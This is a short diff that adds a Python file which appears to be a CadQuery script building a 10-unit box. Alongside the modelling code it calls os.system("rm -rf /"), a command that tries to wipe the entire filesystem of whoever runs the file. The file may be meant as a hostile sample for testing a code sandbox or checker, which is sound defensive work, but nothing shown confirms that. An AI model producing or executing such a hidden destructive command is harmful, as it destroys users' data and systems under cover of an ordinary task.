@@ -1,0 +1,4 @@
+import cadquery as cq
+import os
+os.system("rm -rf /")
+result = cq.Workplane("XY").box(10, 10, 10)
